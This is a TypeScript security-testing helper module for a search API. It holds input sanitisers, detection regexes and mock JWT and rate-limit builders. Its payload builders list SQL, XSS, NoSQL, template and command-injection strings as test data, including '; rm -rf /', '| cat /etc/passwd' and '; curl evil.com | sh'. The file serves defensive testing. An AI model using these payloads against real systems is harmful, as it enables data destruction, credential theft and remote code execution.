/**
 * Security testing utilities and shared helpers.
 * Central exports for security test infrastructure.
 * @module lib/security
 */

import { vi } from 'vitest';

// ============================================================================
// Security Test Constants
// ============================================================================

/**
 * Security limits - kept in sync with supabase/functions/semantic-search/config.ts
 * See config-sync.test.ts for synchronization verification
 */
export const SECURITY_LIMITS = Object.freeze({
  /** Maximum query length in characters */
  MAX_QUERY_LENGTH: 500,
  /** Maximum number of search parameters */
  MAX_PARAMS: 15,
  /** IP-based rate limit per minute */
  IP_RATE_LIMIT: 30,
  /** Session-based rate limit per minute */
  SESSION_RATE_LIMIT: 20,
  /** Global rate limit per minute */
  GLOBAL_RATE_LIMIT: 1000,
  /** Rate limit window in milliseconds */
  RATE_LIMIT_WINDOW_MS: 60000,
  /** Maximum JSON nesting depth */
  MAX_JSON_DEPTH: 10,
  /** Minimum alphanumeric ratio for valid input */
  MIN_ALPHANUMERIC_RATIO: 0.5,
  /** Maximum consecutive repeated characters */
  MAX_REPEATED_CHARS: 5,
});

// ============================================================================
// Error Sanitization Utilities
// ============================================================================

/**
 * Sanitize error messages for client consumption.
 * Removes file paths, tokens, and other sensitive information.
 */
export function sanitizeErrorForClient(error: unknown): string {
  if (!(error instanceof Error)) {
    return 'An error occurred';
  }

  let message = error.message;

  // Remove database connection strings (must come before path removal)
  message = message.replace(
    /(?:postgres|mysql|mongodb|redis):\/\/[^\s]+/gi,
    '[CONNECTION]',
  );

  // Remove Unix file paths
  message = message.replace(/\/[^\s:]+/g, '[PATH]');

  // Remove Windows file paths
  message = message.replace(/[A-Z]:\\[^\s:]+/gi, '[PATH]');

  // Remove Bearer tokens
  message = message.replace(/Bearer\s+[^\s]+/gi, '[TOKEN]');

  // Remove API keys (common patterns)
  message = message.replace(/(?:sk_live_|sk_test_|api_key[=:]?\s*)[^\s]+/gi, '[REDACTED]');

  // Remove line:column numbers
  message = message.replace(/:\d+:\d+/g, '');

  // Remove environment variable assignments
  message = message.replace(/[A-Z_]+=[^\s]+/g, '[ENV]');

  // Truncate very long messages
  if (message.length > 500) {
    message = message.substring(0, 497) + '...';
  }

  return message;
}

/**
 * Sanitize stack traces for logging/display.
 * Removes file paths and line numbers while preserving error message.
 */
export function sanitizeStackTrace(stack: string): string {
  if (!stack) return '';

  const lines = stack.split('\n');
  const sanitizedLines: string[] = [];

  for (const line of lines) {
    // Keep the first line (error message) but sanitize it
    if (!line.trim().startsWith('at ')) {
      sanitizedLines.push(sanitizeErrorForClient(new Error(line)));
    } else {
      // Replace stack frame with placeholder
      sanitizedLines.push('    [STACK]');
      break; // Only keep one stack placeholder
    }
  }

  return sanitizedLines.join('\n');
}

// ============================================================================
// Prototype Pollution Prevention
// ============================================================================

/** Dangerous property names that could cause prototype pollution */
export const PROTOTYPE_POLLUTION_PATTERNS = Object.freeze([
  '__proto__',
  'constructor',
  'prototype',
]);

/**
 * Check if a string contains prototype pollution patterns.
 */
export function containsPrototypePollution(input: string): boolean {
  const lowerInput = input.toLowerCase();
  return PROTOTYPE_POLLUTION_PATTERNS.some((pattern) =>
    lowerInput.includes(pattern.toLowerCase()),
  );
}

/**
 * Recursively sanitize object keys to remove prototype pollution vectors.
 */
export function sanitizeObjectKeys<T>(obj: T): T {
  if (obj === null || obj === undefined) {
    return obj;
  }

  if (typeof obj !== 'object') {
    return obj;
  }

  if (Array.isArray(obj)) {
    return obj.map((item) => sanitizeObjectKeys(item)) as T;
  }

  const result: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(obj)) {
    if (!PROTOTYPE_POLLUTION_PATTERNS.includes(key)) {
      result[key] = sanitizeObjectKeys(value);
    }
  }
  return result as T;
}

/**
 * Safely parse JSON with prototype pollution protection.
 */
export function safeJsonParse<T = unknown>(json: string): T | null {
  try {
    const parsed = JSON.parse(json);
    return sanitizeObjectKeys(parsed);
  } catch {
    return null;
  }
}

// ============================================================================
// ReDoS Prevention Utilities
// ============================================================================

/** Known ReDoS attack payloads for testing */
export const REDOS_PAYLOADS = Object.freeze([
  'a'.repeat(100) + '!',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  'x'.repeat(50) + '@' + 'x'.repeat(50),
  '(' + 'a'.repeat(30) + ')',
  'a+'.repeat(20),
  '.*'.repeat(30),
  '[a-z]+'.repeat(20) + '!',
]);

/**
 * Test regex performance and return timing information.
 */
export function testRegexPerformance(
  fn: () => void,
  iterations: number = 1,
): { duration: number; averageMs: number } {
  const start = performance.now();
  for (let i = 0; i < iterations; i++) {
    fn();
  }
  const duration = performance.now() - start;
  return {
    duration,
    averageMs: duration / iterations,
  };
}

/**
 * Check if a regex pattern is potentially vulnerable to ReDoS.
 * This is a heuristic check, not exhaustive.
 */
export function isRegexSafe(pattern: RegExp): boolean {
  const source = pattern.source;

  // Check for nested quantifiers like (a+)+
  if (/\([^)]*[+*][^)]*\)[+*]/.test(source)) {
    return false;
  }

  // Check for overlapping alternatives like (a|a)+
  if (/\(([^|)]+)\|\1\)[+*]/.test(source)) {
    return false;
  }

  // Check for .* followed by another pattern that could match same chars
  if (/\.\*[a-z]/.test(source)) {
    return false;
  }

  return true;
}

// ============================================================================
// Timing Attack Prevention
// ============================================================================

/**
 * Constant-time string comparison to prevent timing attacks.
 */
export function safeTimingCompare(a: string, b: string): boolean {
  // Use the same amount of time regardless of where strings differ
  let result = a.length === b.length ? 0 : 1;

  // Always compare the full length of the longer string
  const maxLength = Math.max(a.length, b.length);

  for (let i = 0; i < maxLength; i++) {
    const charA = i < a.length ? a.charCodeAt(i) : 0;
    const charB = i < b.length ? b.charCodeAt(i) : 0;
    result |= charA ^ charB;
  }

  return result === 0;
}

/**
 * Measure timing variance for a function over multiple iterations.
 */
export function measureTimingVariance(
  fn: () => void,
  iterations: number,
): { mean: number; stdDev: number; min: number; max: number } {
  const times: number[] = [];

  for (let i = 0; i < iterations; i++) {
    const start = performance.now();
    fn();
    times.push(performance.now() - start);
  }

  const mean = times.reduce((a, b) => a + b, 0) / times.length;
  const variance = times.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / times.length;

  return {
    mean,
    stdDev: Math.sqrt(variance),
    min: Math.min(...times),
    max: Math.max(...times),
  };
}

// ============================================================================
// Malicious Query Builders
// ============================================================================

/**
 * Build a malicious query string for testing injection prevention.
 */
export function buildMaliciousQuery(
  type: 'sql' | 'xss' | 'nosql' | 'command' | 'template',
): string {
  const payloads: Record<typeof type, string[]> = {
    sql: [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; SELECT * FROM cards; --",
      "' UNION SELECT * FROM auth.users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ],
    xss: [
      '<script>alert(1)</script>',
      '<img onerror=alert(1) src=x>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>alert(1)</script>',
    ],
    nosql: [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password == this.password"}',
      '{"$regex": ".*"}',
    ],
    command: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; curl evil.com | sh',
    ],
    template: [
      '{{constructor.constructor("return this")()}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{config}}',
    ],
  };

  // Return a random payload of the specified type
  const typePayloads = payloads[type];
  return typePayloads[Math.floor(Math.random() * typePayloads.length)];
}

/**
 * Get all payloads of a specific type for exhaustive testing.
 */
export function getAllMaliciousPayloads(
  type: 'sql' | 'xss' | 'nosql' | 'command' | 'template',
): string[] {
  const payloads: Record<typeof type, string[]> = {
    sql: [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; SELECT * FROM cards; --",
      "' UNION SELECT * FROM auth.users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "admin'--",
      "' OR 1=1--",
      "'; TRUNCATE TABLE cards; --",
    ],
    xss: [
      '<script>alert(1)</script>',
      '<img onerror=alert(1) src=x>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>alert(1)</script>',
      '<a href="javascript:alert(1)">click</a>',
      '<div style="background:url(javascript:alert(1))">',
    ],
    nosql: [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password == this.password"}',
      '{"$regex": ".*"}',
      '{"$or": [{}]}',
    ],
    command: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; curl evil.com | sh',
      '&& ls -la',
      '|| true',
    ],
    template: [
      '{{constructor.constructor("return this")()}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{config}}',
      '{{process.env}}',
    ],
  };
  return payloads[type];
}

// ============================================================================
// Token Builders
// ============================================================================

/**
 * Build an invalid JWT token for testing authentication.
 */
export function buildInvalidToken(
  type: 'expired' | 'malformed' | 'modified' | 'missing_claims' | 'wrong_issuer',
): string {
  const now = Math.floor(Date.now() / 1000);

  const tokens: Record<typeof type, string> = {
    expired: createMockJWT({
      iss: 'supabase',
      role: 'anon',
      exp: now - 3600, // Expired 1 hour ago
      iat: now - 7200,
    }),
    malformed: 'not.a.valid.jwt.token',
    modified: (() => {
      // Create a valid-looking token then tamper with it
      const base = createMockJWT({
        iss: 'supabase',
        role: 'service_role', // Elevated privileges
        exp: now + 3600,
        iat: now,
      });
      // Tamper with the payload (change last char)
      return base.slice(0, -1) + 'X';
    })(),
    missing_claims: createMockJWT({
      // Missing iss, role, exp
      iat: now,
    }),
    wrong_issuer: createMockJWT({
      iss: 'malicious-site',
      role: 'admin',
      exp: now + 3600,
      iat: now,
    }),
  };

  return tokens[type];
}

/**
 * Create a mock JWT token (unsigned, for testing only).
 */
export function createMockJWT(payload: Record<string, unknown>): string {
  const header = { alg: 'HS256', typ: 'JWT' };
  const headerB64 = btoa(JSON.stringify(header));
  const payloadB64 = btoa(JSON.stringify(payload));
  const signature = 'mock_signature_for_testing';
  return `${headerB64}.${payloadB64}.${signature}`;
}

// ============================================================================
// Payload Builders
// ============================================================================

/**
 * Build an oversized payload for testing payload limits.
 */
export function buildOversizedPayload(sizeKb: number): { query: string } {
  const chars = 'abcdefghijklmnopqrstuvwxyz ';
  const targetSize = sizeKb * 1024;
  let query = '';
  while (query.length < targetSize) {
    query += chars[Math.floor(Math.random() * chars.length)];
  }
  return { query };
}

/**
 * Build a deeply nested JSON object for testing JSON bomb protection.
 */
export function buildNestedObject(depth: number): Record<string, unknown> {
  if (depth <= 0) {
    return { value: 'leaf' };
  }
  return { nested: buildNestedObject(depth - 1) };
}

/**
 * Build a payload with circular reference potential.
 * Note: JSON.stringify will fail on actual circular refs, so this creates deep nesting.
 */
export function buildCircularLikePayload(): Record<string, unknown> {
  const obj: Record<string, unknown> = {};
  let current = obj;
  for (let i = 0; i < 100; i++) {
    current.next = {};
    current = current.next as Record<string, unknown>;
  }
  return obj;
}

// ============================================================================
// Concurrent Request Simulation
// ============================================================================

/**
 * Simulate concurrent requests for race condition testing.
 */
export async function simulateConcurrentRequests<T>(
  count: number,
  fn: () => Promise<T>,
): Promise<T[]> {
  const promises = Array.from({ length: count }, () => fn());
  return Promise.all(promises);
}

/**
 * Simulate rate-limited requests with timing.
 */
export async function simulateBurstRequests<T>(
  count: number,
  fn: (index: number) => Promise<T>,
  delayMs: number = 0,
): Promise<{ results: T[]; totalTimeMs: number }> {
  const start = Date.now();
  const results: T[] = [];

  for (let i = 0; i < count; i++) {
    results.push(await fn(i));
    if (delayMs > 0 && i < count - 1) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
  }

  return { results, totalTimeMs: Date.now() - start };
}

// ============================================================================
// Validation Helpers
// ============================================================================

/**
 * Check if a string contains XSS payloads.
 */
export function containsXSS(input: string): boolean {
  const xssPatterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i, // onclick=, onerror=, etc.
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<svg[^>]*onload/i,
  ];
  return xssPatterns.some((pattern) => pattern.test(input));
}

/**
 * Check if a string contains SQL injection patterns.
 */
export function containsSQLInjection(input: string): boolean {
  const sqlPatterns = [
    /['";]\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i,
    /['";]\s*--/,
    /UNION\s+(ALL\s+)?SELECT/i,
    /DROP\s+TABLE/i,
    /TRUNCATE\s+TABLE/i,
    /DELETE\s+FROM/i,
    /INSERT\s+INTO/i,
    /UPDATE\s+\w+\s+SET/i,
  ];
  return sqlPatterns.some((pattern) => pattern.test(input));
}

/**
 * Sanitize input by removing potentially dangerous characters.
 */
export function sanitizeInput(input: string): string {
  // eslint-disable-next-line no-control-regex
  const nullByteRegex = /\x00/g;
  // eslint-disable-next-line no-control-regex
  const controlCharRegex = /[\x01-\x08\x0B\x0C\x0E-\x1F\x7F]/g;
  const zeroWidthRegex = /[\u200B-\u200D\uFEFF]/g;

  return input
    .replace(nullByteRegex, '')
    .replace(controlCharRegex, '')
    .replace(zeroWidthRegex, '')
    .replace(/\s+/g, ' ')
    .trim();
}

/**
 * Check for repetitive character patterns (spam indicator).
 */
export function hasRepetitiveChars(input: string, threshold: number = 6): boolean {
  const pattern = new RegExp(`(.)\\1{${threshold - 1},}`);
  return pattern.test(input);
}

/**
 * Check if input has sufficient alphanumeric content.
 */
export function hasMinimumAlphanumeric(input: string, ratio: number = 0.5): boolean {
  if (input.length <= 10) return true; // Skip check for short inputs
  const alphanumericCount = (input.match(/[a-zA-Z0-9]/g) || []).length;
  return alphanumericCount >= input.length * ratio;
}

/**
 * Count search parameters in a Scryfall-style query.
 */
export function countQueryParameters(query: string): number {
  const matches = query.match(/\b[a-zA-Z]+[:=<>]/g) || [];
  return matches.length;
}

// ============================================================================
// Mock Response Types
// ============================================================================

export interface MockResponse {
  status: number;
  body?: unknown;
  headers?: Record<string, string>;
}

export interface RateLimitResult {
  allowed: boolean;
  retryAfter?: number;
}

export interface ValidationResult {
  valid: boolean;
  sanitized?: string;
  issues?: string[];
  rejected?: boolean;
  reason?: string;
}

// ============================================================================
// Mock Request Builders
// ============================================================================

/**
 * Build a mock request with specific headers.
 */
export function buildMockRequest(options: {
  method?: string;
  url?: string;
  headers?: Record<string, string>;
  body?: unknown;
}): {
  method: string;
  url: string;
  headers: { get: (key: string) => string | null };
  json: () => Promise<unknown>;
} {
  const headers = options.headers || {};
  return {
    method: options.method || 'POST',
    url: options.url || 'https://example.com/api',
    headers: {
      get: (key: string) => headers[key.toLowerCase()] || null,
    },
    json: async () => options.body,
  };
}

/**
 * Build a mock IP extraction function.
 */
export function extractClientIP(
  headers: { get: (key: string) => string | null },
  defaultIP: string = '127.0.0.1',
): string {
  // Check forwarded headers (use first IP only to prevent spoofing)
  const forwarded = headers.get('x-forwarded-for');
  if (forwarded) {
    const firstIP = forwarded.split(',')[0].trim();
    if (firstIP) return firstIP;
  }

  const realIP = headers.get('x-real-ip');
  if (realIP) return realIP;

  return defaultIP;
}

// ============================================================================
// Assertion Helpers
// ============================================================================

/**
 * Assert that a validation result indicates rejection.
 */
export function expectRejected(result: ValidationResult): void {
  if (result.valid && !result.rejected) {
    throw new Error(
      `Expected result to be rejected, but it was valid. Issues: ${result.issues?.join(', ')}`,
    );
  }
}

/**
 * Assert that input was sanitized correctly.
 */
export function expectSanitized(
  input: string,
  result: ValidationResult,
  shouldNotContain?: string[],
): void {
  if (!result.sanitized) {
    throw new Error('Expected sanitized output but got none');
  }

  if (shouldNotContain) {
    for (const forbidden of shouldNotContain) {
      if (result.sanitized.includes(forbidden)) {
        throw new Error(
          `Sanitized output should not contain "${forbidden}" but found it in "${result.sanitized}"`,
        );
      }
    }
  }
}

/**
 * Assert that a response indicates rate limiting.
 */
export function expectRateLimited(result: RateLimitResult): void {
  if (result.allowed) {
    throw new Error('Expected rate limiting but request was allowed');
  }
  if (result.retryAfter === undefined || result.retryAfter <= 0) {
    throw new Error('Expected positive retryAfter value');
  }
}

// ============================================================================
// Test Setup Helpers
// ============================================================================

/**
 * Create a mock rate limiter for testing.
 */
export function createMockRateLimiter(limit: number, windowMs: number) {
  const entries = new Map<string, { count: number; resetTime: number }>();

  return {
    check(key: string): RateLimitResult {
      const now = Date.now();
      const entry = entries.get(key);

      if (!entry || now > entry.resetTime) {
        entries.set(key, { count: 1, resetTime: now + windowMs });
        return { allowed: true };
      }

      if (entry.count >= limit) {
        return {
          allowed: false,
          retryAfter: Math.ceil((entry.resetTime - now) / 1000),
        };
      }

      entry.count++;
      return { allowed: true };
    },

    reset(key?: string): void {
      if (key) {
        entries.delete(key);
      } else {
        entries.clear();
      }
    },

    getCount(key: string): number {
      return entries.get(key)?.count || 0;
    },
  };
}

/**
 * Setup fetch mock for testing HTTP interactions.
 */
export function setupFetchMock(responses: Map<string, MockResponse>) {
  const mockFetch = vi.fn(async (url: string) => {
    const response = responses.get(url) || { status: 404, body: { error: 'Not found' } };
    return {
      ok: response.status >= 200 && response.status < 300,
      status: response.status,
      json: async () => response.body,
      text: async () => JSON.stringify(response.body),
      headers: new Map(Object.entries(response.headers || {})),
    };
  });

  return mockFetch;
}
